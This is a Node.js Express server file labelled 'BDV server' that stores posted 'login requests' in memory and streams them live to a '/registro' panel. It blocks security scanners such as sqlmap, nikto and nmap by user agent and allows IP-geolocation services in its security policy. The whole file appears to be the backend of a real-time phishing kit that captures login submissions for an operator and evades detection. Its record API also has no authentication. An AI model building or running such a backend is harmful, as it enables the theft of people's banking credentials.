import express from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import compression from 'compression';
import path from 'path';
import { fileURLToPath } from 'url';
import pino from 'pino';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DIST = path.join(__dirname, 'dist');
const PORT = process.env.PORT || 3000;
const IS_PROD = process.env.NODE_ENV === 'production';

// ─── Logger (JSON to stdout — Railway captures it in its log viewer) ──────────
const logger = pino({ level: process.env.LOG_LEVEL || 'info' });

const app = express();

// ─── In-memory store + SSE broadcast ─────────────────────────────────────────
let records = [];
const sseClients = new Set();

function broadcast(event) {
  const payload = `data: ${JSON.stringify(event)}\n\n`;
  for (const res of sseClients) {
    try { res.write(payload); } catch { sseClients.delete(res); }
  }
}

// ─── Middleware order (critical) ──────────────────────────────────────────────

// 1. Trust Railway's proxy so req.ip is the real client IP
app.set('trust proxy', 1);

// 2. Slowloris / request-timeout defense
app.use((req, res, next) => {
  req.setTimeout(10_000, () => {
    logger.warn({ ip: req.ip, path: req.path }, 'Request timeout');
    res.status(408).end();
  });
  next();
});

// 3. Malicious bot blocking
const MALICIOUS_UA = [
  /sqlmap/i, /nikto/i, /masscan/i, /zgrab/i, /nmap/i,
  /dirbuster/i, /nuclei/i, /hydra/i, /metasploit/i,
  /python-requests\/[01]\./i, /libwww-perl/i, /scrapy/i,
];
app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  if (!ua || MALICIOUS_UA.some(p => p.test(ua))) {
    logger.warn({ ip: req.ip, ua, path: req.path }, 'Blocked: suspicious UA');
    return res.status(403).end();
  }
  next();
});

// 4. Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", 'connect.facebook.net', 'https://www.googletagmanager.com'],
      styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com', 'https://fonts.googleapis.com'],
      imgSrc: ["'self'", 'data:', 'https:', 'blob:'],
      connectSrc: ["'self'", 'https://ipapi.co', 'https://ipwho.is', 'https://www.facebook.com'],
      frameSrc: ["'self'", 'https://maps.google.com', 'https://www.google.com'],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: IS_PROD ? [] : null,
    },
  },
  hsts: IS_PROD ? { maxAge: 31_536_000, includeSubDomains: true, preload: true } : false,
  crossOriginEmbedderPolicy: false,
}));

// 5. Compression
app.use(compression({ level: 6, threshold: 1024 }));

// 6. Rate limiting
const limiter = (max) => rateLimit({
  windowMs: 15 * 60 * 1000, max,
  standardHeaders: true, legacyHeaders: false,
  handler: (req, res) => {
    logger.warn({ ip: req.ip, path: req.path }, 'Rate limit exceeded');
    res.status(429).json({ error: 'Too many requests' });
  },
});
// /api/auth: strict (login attempts)
app.use('/api/auth', limiter(20));
// /api/events (SSE) and /api/login-requests: high limit — panel polls every 3s
// All Railway clients share the proxy IP so the limit must cover all users
app.use('/api', limiter(5000));
// Global: block port-scanners and bots
app.use(limiter(2000));

// 7. Body parser
app.use(express.json({ limit: '16kb' }));

// 8. Request logging
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    logger.info({ method: req.method, path: req.path, status: res.statusCode, ms: Date.now() - start, ip: req.ip });
  });
  next();
});

// ─── Health ───────────────────────────────────────────────────────────────────
app.get('/health', (_req, res) => {
  res.json({ status: 'ok', uptime: Math.floor(process.uptime()), records: records.length });
});

// ─── No-cache middleware for all /api routes ─────────────────────────────────
app.use('/api', (_req, res, next) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  next();
});

// ─── SSE: real-time push to /registro panel ───────────────────────────────────
app.get('/api/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no'); // disables Nginx/Cloudflare buffering
  res.flushHeaders();

  // Send all current records on connect
  res.write(`data: ${JSON.stringify({ type: 'init', records })}\n\n`);

  sseClients.add(res);
  req.on('close', () => sseClients.delete(res));
});

// ─── CRUD API for LoginRequest ────────────────────────────────────────────────
app.get('/api/login-requests', (_req, res) => {
  res.json([...records].sort((a, b) => b.created_date.localeCompare(a.created_date)));
});

app.post('/api/login-requests', (req, res) => {
  const record = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`,
    created_date: new Date().toISOString(),
    ...req.body,
  };
  records.unshift(record);
  broadcast({ type: 'create', id: record.id, data: record });
  res.status(201).json(record);
});

app.patch('/api/login-requests/:id', (req, res) => {
  const idx = records.findIndex(r => r.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Not found' });
  records[idx] = { ...records[idx], ...req.body, updated_date: new Date().toISOString() };
  broadcast({ type: 'update', id: records[idx].id, data: records[idx] });
  res.json(records[idx]);
});

app.delete('/api/login-requests/:id', (req, res) => {
  records = records.filter(r => r.id !== req.params.id);
  broadcast({ type: 'delete', id: req.params.id });
  res.json({ success: true });
});

// ─── Static files ─────────────────────────────────────────────────────────────
app.use(express.static(DIST, {
  maxAge: '1y',
  immutable: true,
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('index.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    }
  },
}));

// ─── SPA fallback ─────────────────────────────────────────────────────────────
app.get('*', (_req, res) => res.sendFile(path.join(DIST, 'index.html')));

app.listen(PORT, () => logger.info({ port: PORT }, 'BDV server ready'));
